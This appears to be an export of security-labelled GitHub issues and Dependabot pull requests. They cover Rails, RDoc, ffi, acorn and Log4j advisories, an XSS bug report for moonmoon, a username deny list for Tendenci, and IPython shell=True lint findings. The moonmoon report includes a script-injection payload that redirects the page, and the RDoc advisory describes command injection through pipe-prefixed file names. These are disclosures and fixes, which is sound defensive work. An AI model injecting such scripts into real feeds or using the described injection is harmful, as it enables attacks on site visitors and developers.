<p>... (truncated)</p>
<blockquote>
<p>Patched versions: ~&gt; 5.2.4.3; &gt;= 6.0.3.1
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2020-8165.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore</strong>
There is potentially unexpected behaviour in the MemCacheStore and RedisCacheStore where, when
untrusted user input is written to the cache store using the <code>raw: true</code> parameter, re-reading the result
from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:</p>
<pre><code>data = cache.fetch(&quot;demo&quot;, raw: true) { untrusted_string }
</code></pre>
<p>Versions Affected:  rails &lt; 5.2.5, rails &lt; 6.0.4
Not affected:       Applications not using MemCacheStore or RedisCacheStore. Applications that do not use the <code>raw</code> option when storing untrusted user input.
Fixed Versions:     rails &gt;= 5.2.4.3, rails &gt;= 6.0.3.1</p>
<h2>Impact</h2>
<p>Unmarshalling of untrusted user input can have impact up to and including RCE. At a minimum,
this vulnerability allows an attacker to inject untrusted Ruby objects into a web application.</p>
<p>In addition to upgrading to the latest versions of Rails, developers should ensure that whenever
they are calling <code>Rails.cache.fetch</code> they are using consistent values of the <code>raw</code> parameter for both</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: ~&gt; 5.2.4, &gt;= 5.2.4.3; &gt;= 6.0.3.1
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/rails/rails/releases"">activesupport's releases</a>.</em></p>
<blockquote>
<h2>6.1.3.2</h2>
<h2>Active Support</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Active Model</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Active Record</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Action View</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Action Pack</h2>
<ul>
<li>
<p>Prevent open redirects by correctly escaping the host allow list
CVE-2021-22903</p>
</li>
<li>
<p>Prevent catastrophic backtracking during mime parsing
CVE-2021-22902</p>
</li>
<li>
<p>Prevent regex DoS in HTTP token authentication
CVE-2021-22904</p>
</li>
<li>
<p>Prevent string polymorphic route arguments.</p>
<p><code>url_for</code> supports building polymorphic URLs via an array
of arguments (usually symbols and records). If a developer passes a
user input array, strings can result in unwanted route helper calls.</p>
<p>CVE-2021-22885</p>
<p><em>Gannon McGibbon</em></p>
</li>
</ul>
<h2>Active Job</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/rails/rails/blob/v6.1.3.2/activesupport/CHANGELOG.md"">activesupport's changelog</a>.</em></p>
<blockquote>
<h2>Rails 6.1.3.2 (May 05, 2021)</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Rails 6.1.3.1 (March 26, 2021)</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Rails 6.1.3 (February 17, 2021)</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Rails 6.1.2.1 (February 10, 2021)</h2>
<ul>
<li>No changes.</li>
</ul>
<h2>Rails 6.1.2 (February 09, 2021)</h2>
<ul>
<li>
<p><code>ActiveSupport::Cache::MemCacheStore</code> now accepts an explicit <code>nil</code> for its <code>addresses</code> argument.</p>
<pre lang=""ruby""><code>config.cache_store = :mem_cache_store, nil
<h1>is now equivalent to</h1>
<p>config.cache_store = :mem_cache_store</p>
<h1>and is also equivalent to</h1>
<p>config.cache_store = :mem_cache_store, ENV[&quot;MEMCACHE_SERVERS&quot;] || &quot;localhost:11211&quot;</p>
<h1>which is the fallback behavior of Dalli</h1>
<p></code></pre></p>
<p>This helps those migrating from <code>:dalli_store</code>, where an explicit <code>nil</code> was permitted.</p>
<p><em>Michael Overmeyer</em></p>
</li>
</ul>
<h2>Rails 6.1.1 (January 07, 2021)</h2>
<ul>
<li>
<p>Change <code>IPAddr#to_json</code> to match the behavior of the json gem returning the string representation
instead of the instance variables of the object.</p>
<p>Before:</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/rails/rails/commit/75ac626c4e21129d8296d4206a1960563cc3d4aa""><code>75ac626</code></a> Preparing for 6.1.3.2 release</li>
<li><a href=""https://github.com/rails/rails/commit/9c21201772d240d58462796ae9f4d03765f573b4""><code>9c21201</code></a> Prep for release</li>
<li><a href=""https://github.com/rails/rails/commit/85c6823b77b60f2a3a6a25d7a1013032e8c580ef""><code>85c6823</code></a> v6.1.3.1</li>
<li><a href=""https://github.com/rails/rails/commit/5aaaa1630ae9a71b3c3ecc4dc46074d678c08d67""><code>5aaaa16</code></a> Preparing for 6.1.3 release</li>
<li><a href=""https://github.com/rails/rails/commit/eddb809b92808de50235a7975106ff974bee540f""><code>eddb809</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/rails/rails/issues/41441"">#41441</a> from jonathanhefner/apidocs-inline-code-markup</li>
<li><a href=""https://github.com/rails/rails/commit/130c128eae233bf71231c73b9c3c3b3f3ede918b""><code>130c128</code></a> Preparing for 6.1.2.1 release</li>
<li><a href=""https://github.com/rails/rails/commit/bf8c59cd896b1bf98d0f3df356531fa4c163219f""><code>bf8c59c</code></a> Preparing for 6.1.2 release</li>
<li><a href=""https://github.com/rails/rails/commit/ca798c0a1e386186710de147f3f7dba5473079ab""><code>ca798c0</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/rails/rails/issues/41381"">#41381</a> from movermeyer/allow_for_nil_addresses_from_dalli_...</li>
<li><a href=""https://github.com/rails/rails/commit/97a0a94cc825810f4cd1e3c74cf75ed7159a330c""><code>97a0a94</code></a> Fix warning with Ruby 2.7 on Time.at with keyword arguments</li>
<li><a href=""https://github.com/rails/rails/commit/5400804d18d11051fcc37b39abc11ba4049909a0""><code>5400804</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/rails/rails/issues/41376"">#41376</a> from fatkodima/memcached-normalize_key-nil</li>
<li>Additional commits viewable in <a href=""https://github.com/rails/rails/compare/v4.1.6...v6.1.3.2"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=activesupport&package-manager=bundler&previous-version=4.1.6&new-version=6.1.3.2)](https://dependabot.com/compatibility-score/?dependency-name=activesupport&package-manager=bundler&previous-version=4.1.6&new-version=6.1.3.2)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrmehle/songkickr,875775326,"[Security] Update rdoc requirement from ~> 4.1.0 to ~> 6.3.1","[//]: # (dependabot-start)
⚠️  **Dependabot Preview has been deactivated** ⚠️

This pull request was created by Dependabot Preview, and you've upgraded to Dependabot. This means it won't respond to `dependabot` commands nor will it be automatically closed if a new version is found.

If you close this pull request, Dependabot will re-create it the next time it checks for updates and everything will work as expected.

---

[//]: # (dependabot-end)
Updates the requirements on [rdoc](https://github.com/ruby/rdoc) to permit the latest version.
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2021-31799.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>RDoc OS command injection vulnerability</strong>
RDoc used to call <code>Kernel#open</code> to open a local file. If a Ruby project has
a file whose name starts with <code>|</code> and ends with <code>tags</code>, the command following
the pipe character is executed. A malicious Ruby project could exploit it to
run an arbitrary command execution against a user who attempts to run <code>rdoc</code>
command.</p>
<p>Patched versions: &gt;= 6.3.1
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/ruby/rdoc/blob/master/History.rdoc"">rdoc's changelog</a>.</em></p>
<blockquote>
<p>=== 5.1.0 / 2017-02-24</p>
<ul>
<li>
<p>Bug fixes</p>
<ul>
<li>Fix an issue that rdoc fails when running on Windows with RUBYOPT=-U.
PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/430"">#430</a> by Toshihiko Ichida</li>
</ul>
</li>
<li>
<p>Minor enhancements</p>
<ul>
<li>Parse ruby 2.1 <!-- raw HTML omitted --> def. PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/436"">#436</a> by Akira Matsuda.</li>
<li>Suppress warnings in eval. PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/440"">#440</a> by Nobuyoshi Nakada.</li>
</ul>
</li>
</ul>
<p>=== 5.0.0 / 2016-11-05</p>
<ul>
<li>
<p>Major enhancements</p>
<ul>
<li>Cleanup deprecated code targeted Ruby 1.8</li>
</ul>
</li>
<li>
<p>Bug fixes</p>
<ul>
<li>Ensure badge data is included in result of JsonIndex template.</li>
<li>Ensure items in the nil section are displayed in HTML output.  Issue <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/399"">#399</a>
by Daniel Svensson.</li>
<li>Parse rb_intern_const correctly in C.  PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/381"">#381</a> by Sho Hashimoto.</li>
<li>Fix broken assets caused by <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/335"">#335</a> when serving ri.  PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/360"">#360</a> by Alex Wood.</li>
<li>Don't try to parse svg files.  Issue <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/350"">#350</a> by Sigurd Svela.</li>
</ul>
</li>
<li>
<p>Minor enhancements</p>
<ul>
<li>Improve class name expansion/resolution in ri.  PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/400"">#400</a> by NARUSE, Yui</li>
<li>Improve performance of document generation. PR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/397"">#397</a> by Yusuke Endoh.</li>
</ul>
</li>
</ul>
<p>=== 4.3.0 / 2016-11-04</p>
<ul>
<li>Minor enhancements
<ul>
<li>Removed json dependency for Ruby 2.4.0</li>
<li>End to support Ruby 1.8.x</li>
</ul>
</li>
</ul>
<p>=== 4.2.2 / 2016-02-09</p>
<ul>
<li>Bug fixes
<ul>
<li>Include lib/rdoc/generator/pot/* in built gem</li>
</ul>
</li>
</ul>
<p>=== 4.2.1 / 2015-12-22</p>
<ul>
<li>Bug fixes
<ul>
<li>Fixed infinite loop with CR <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/339"">#339</a> by <a href=""https://github.com/nobu""><code>@​nobu</code></a></li>
<li>Allow rdoc run with --disable-gems <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/340"">#340</a>  by <a href=""https://github.com/luizluca""><code>@​luizluca</code></a></li>
<li>Don't store full path in GZipped js files <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/341"">#341</a> by <a href=""https://github.com/voxik""><code>@​voxik</code></a></li>
<li>Fix relative path names for drive letters <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/367"">#367</a> by <a href=""https://github.com/nobu""><code>@​nobu</code></a></li>
<li>Fix for valid syntax <code>class C end</code> parsing <a href=""https://github-redirect.dependabot.com/ruby/rdoc/issues/368"">#368</a> by <a href=""https://github.com/nobu""><code>@​nobu</code></a></li>
</ul>
</li>
</ul>
<p>=== 4.2.0 / 2014-12-06</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/ruby/rdoc/commits"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=rdoc&package-manager=bundler&previous-version=4.1.2&new-version=6.3.1)](https://dependabot.com/compatibility-score/?dependency-name=rdoc&package-manager=bundler&previous-version=4.1.2&new-version=6.3.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrmehle/songkickr,908163827,"[Security] Bump ffi from 1.9.6 to 1.15.1","[//]: # (dependabot-start)
⚠️  **Dependabot Preview has been deactivated** ⚠️

This pull request was created by Dependabot Preview, and you've upgraded to Dependabot. This means it won't respond to `dependabot` commands nor will it be automatically closed if a new version is found.

If you close this pull request, Dependabot will re-create it the next time it checks for updates and everything will work as expected.

---

[//]: # (dependabot-end)
Bumps [ffi](https://github.com/ffi/ffi) from 1.9.6 to 1.15.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/ffi/CVE-2018-1000201.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>ruby-ffi DDL loading issue on Windows OS</strong>
ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be
hijacked on Windows OS, when a Symbol is used as DLL name instead of a String
This vulnerability appears to have been fixed in v1.9.24 and later.</p>
<p>Patched versions: &gt;= 1.9.24
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/ffi/ffi/blob/master/CHANGELOG.md"">ffi's changelog</a>.</em></p>
<blockquote>
<h2>1.15.1 / 2021-05-22</h2>
<p>Fixed:</p>
<ul>
<li>Append -pthread to linker options. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/893"">#893</a></li>
<li>Use arm or aarch64 to identify Apple ARM CPU arch. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/899"">#899</a></li>
<li>Allow overriding <code>gcc</code> with the <code>CC</code> env var in <code>const_generator.rb</code> and <code>struct_generator.rb</code>. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/897"">#897</a></li>
</ul>
<h2>1.15.0 / 2021-03-05</h2>
<p>Fixed:</p>
<ul>
<li>Fix MSVC build</li>
<li>Fix async callbacks in conjunction with fork(). <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/884"">#884</a></li>
</ul>
<p>Added:</p>
<ul>
<li>Allow to pass callbacks in varargs. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/885"">#885</a></li>
<li>Name the threads for FFI callback dispatcher and async thread calls for easier debugging. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/883"">#883</a>
The name can be retrieved by Thread.name and is shown by Thread.list.inspect etc.
Even gdb shows the thread name on supported operating systems.</li>
<li>Add types.conf for powerpc64le-linux</li>
<li>Add types.conf for riscv64-linux</li>
<li>More release automation of ffi gems</li>
</ul>
<p>Changed:</p>
<ul>
<li>Switch from rubygems-tasks to bundler/gem_helper</li>
</ul>
<p>Removed:</p>
<ul>
<li>Remove unused VariadicInvoker#init</li>
</ul>
<h2>1.14.2 / 2020-12-21</h2>
<p>Fixed:</p>
<ul>
<li>Fix builtin libffi on newer Ubuntu caused by an outdated Makefile.in . <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/863"">#863</a></li>
</ul>
<h2>1.14.1 / 2020-12-19</h2>
<p>Changed:</p>
<ul>
<li>Revert changes to FFI::Pointer#write_string made in ffi-1.14.0.
It breaks compatibilty in a way that can cause hard to find errors. <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/857"">#857</a></li>
</ul>
<h2>1.14.0 / 2020-12-18</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/ffi/ffi/commit/513aef49803774ed1a4201f2ae4b51b63955db8b""><code>513aef4</code></a> Bump VERSION to 1.15.1</li>
<li><a href=""https://github.com/ffi/ffi/commit/a0a457bdb03190792780bcbf3e2447a9fc0beba8""><code>a0a457b</code></a> Update CHANGELOG for ffi-1.15.1</li>
<li><a href=""https://github.com/ffi/ffi/commit/54db5ef6ecfbc8a2ae6ac7f9617c01406cd01fe1""><code>54db5ef</code></a> Append -pthread to linker options</li>
<li><a href=""https://github.com/ffi/ffi/commit/4ad6fd5f825c6d673d542571d015e198a4d0acff""><code>4ad6fd5</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/899"">#899</a> from andrewferk/apple-m1-arm-aarch64</li>
<li><a href=""https://github.com/ffi/ffi/commit/305600997c5d2a513cf788850faa208f4aecfcb8""><code>3056009</code></a> Use arm or aarch64 to identify Apple ARM CPU arch</li>
<li><a href=""https://github.com/ffi/ffi/commit/4430b6d5fe720f9cb84a845a0bee9abf23e22cea""><code>4430b6d</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ffi/ffi/issues/897"">#897</a> from leshik/fix-cc</li>
<li><a href=""https://github.com/ffi/ffi/commit/928e3f9188eeed7e6c1c640576869c038c9ed7a9""><code>928e3f9</code></a> Allow overriding <code>gcc</code> with the <code>CC</code> env var in <code>const_generator.rb</code> and `str...</li>
<li><a href=""https://github.com/ffi/ffi/commit/2cc0e530710501e3ef1bfebaa2122e45b439476a""><code>2cc0e53</code></a> Relax bundler version for JRuby on Github Actions</li>
<li><a href=""https://github.com/ffi/ffi/commit/9d7eeb7471cda75f1eb3f57d1c17147dbc8a0a42""><code>9d7eeb7</code></a> Merge branch 'master' of github.com:ffi/ffi</li>
<li><a href=""https://github.com/ffi/ffi/commit/85f7db9ec51635ab8fa21e26813b6274c643aac9""><code>85f7db9</code></a> Revert &quot;Enable loading FFI gem on rubinius&quot;</li>
<li>Additional commits viewable in <a href=""https://github.com/ffi/ffi/compare/v1.9.6...v1.15.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=ffi&package-manager=bundler&previous-version=1.9.6&new-version=1.15.1)](https://dependabot.com/compatibility-score/?dependency-name=ffi&package-manager=bundler&previous-version=1.9.6&new-version=1.15.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
embedthis/ejscript,50873369,"Ejscript Security Alerts","### Ejscript Security Alerts

Notification Alert Log for Ejscript security issues. Subscribe to be notified when alerts are posted to log.
",,no,"security,"
datejs/Datejs,580893323,"[Security] Bump acorn from 5.7.3 to 5.7.4","Bumps [acorn](https://github.com/acornjs/acorn) from 5.7.3 to 5.7.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-7fhm-mqm4-2wp7"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects acorn, minimist, and svjsl</strong>
There are high severity security vulnerabilities in two of ESLints dependencies:
- <a href=""https://app.snyk.io/vuln/SNYK-JS-ACORN-559469"">acorn</a>
- <a href=""https://app.snyk.io/vuln/SNYK-JS-MINIMIST-559764"">minimist</a></p>
<p>The releases 1.8.3 and lower of svjsl (JSLib-npm) are vulnerable, but only if installed in a developer environment. A patch has been released (v1.8.4) which fixes these vulnerabilities.</p>
<p>Identifiers:</p>
<ul>
<li><a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7598"">CVE-2020-7598</a></li>
<li>SNYK-JS-ACORN-559469 (doesn&amp;#39;t have a CVE identifier)</li>
</ul>
<p>Affected versions: &lt; 5.7.4</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/acornjs/acorn/commit/6370e90067552022710190319cbbbd8c43001957""><code>6370e90</code></a> Mark version 5.7.4</li>
<li><a href=""https://github.com/acornjs/acorn/commit/fbc15b1344f6dfb992f67b4bbf1357436247c8a0""><code>fbc15b1</code></a> More rigorously check surrogate pairs in regexp validator</li>
<li>See full diff in <a href=""https://github.com/acornjs/acorn/compare/5.7.3...5.7.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=acorn&package-manager=npm_and_yarn&previous-version=5.7.3&new-version=5.7.4)](https://dependabot.com/compatibility-score/?dependency-name=acorn&package-manager=npm_and_yarn&previous-version=5.7.3&new-version=5.7.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","[![CLA assistant check](https://cla-assistant.io/pull/badge/not_signed)](https://cla-assistant.io/datejs/Datejs?pullRequest=141) <br/>Thank you for your submission! We really appreciate it. Like many open source projects, we ask that you sign our [Contributor License Agreement](https://cla-assistant.io/datejs/Datejs?pullRequest=141) before we can accept your contribution.<br/><sub>You have signed the CLA already but the status is still pending? Let us [recheck](https://cla-assistant.io/check/datejs/Datejs?pullRequest=141) it.</sub>",yes,"dependencies,security,"
brianfrankcooper/YCSB,1084957744,"CVE-2021-45105: Bumping Log4j to 2.17.0 on elasticsearch5, ignite, and voltdb","Following up on Security Vulnerability CVE-2021-45105","@filipecosta90 Thanks a lot for the patch, it has been included in Apache Bigtop's ycsb package :)",yes,"security,"
futureshape/cyclehireapp,289706,"Account password should be stored more securely in Keychain","Use code from: 
http://github.com/ldandersen/scifihifi-iphone/tree/master/security
",,no,"security,"
moonmoon/moonmoon,642995862,"JS in feed content isn't sanitized at all.","### Expected behavior

I expect javascript in feed content NOT to be run

### Actual behavior

Javascript in feed content runs

### Steps to reproduce

* put javascript in a feed (ie: `<script>document.location.replace('https://example.com');</script>`)
* add feed to moonmoon
* open main page on moonmoon

### Moonmoon version

9.0.0-rc.3","That's because of:
https://github.com/moonmoon/moonmoon/blob/ee9c408f719491ecb7947d83994bed1803a988e8/app/classes/PlanetFeed.php#L26

Switching it to `false` will filter out the JavaScript (among other things). See https://github.com/simplepie/simplepie/blob/1aec297145a150f627e6ed82b8b084e0c933def8/library/SimplePie.php#L1178-L1191 for the changes it implies.

Maybe we should make both the full trigger configurable (but not recommended), or make a custom selection of the features to turn on/off? At least to force `$this->strip_htmltags(true)`.",no,"bug,security,"
tendenci/tendenci,656208404,"deny common usernames for tendenci application","Please add error trapping to prevent the following and any derivations you can think of from being used as usernames on any Tendenci site for better security. If there are existing usernames out there that fall into this category, and are NOT superusers, they must be assigned a random different unique string.

1. admin
1. administrator
1. root
1. oracle
1. ubuntu
1. postgres
1. ec2_user
1. tendenciapp
1. tendenciadmin
1. wp-admin
1. admin-user
1. guest
1. nagios
1. mysql
1. tomcat
1. alex
1. pos
1. db2admin
1. sql
1. api

Open to new, revisions, suggestions or changes to modify the list. Just had a creative user change their username on one of our sites to ""admin"" which implies a level of authority they do not have.

",,no,"Best Practices,SECURITY,"
afternoon/followize,192724,"Store OAuth details in cookies","- Set cookie on server when OAuth succeeds.
- Read cookies on client when initialising Twitter session.
",,no,"feature,security,"
ipython/ipython,535410859,"Command injection in IPython","Hi IPython,

First off, I'd like to say how much I enjoy using IPython - I use it every day. Recently I've begun work on a [static analysis tool](https://github.com/dlint-py/dlint) for Python code. I ran a subset of its rules against the IPython code base and received some interesting results. In particular, Dlint's checks for `shell=True` subprocess calls:

```
$ python3 -m flake8 --select=DUO116 ipython/IPython/
ipython/IPython/core/interactiveshell.py:2482:22: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
ipython/IPython/core/hooks.py:80:12: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
ipython/IPython/core/page.py:214:24: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
ipython/IPython/lib/editorhooks.py:55:16: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
ipython/IPython/utils/_process_common.py:79:9: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
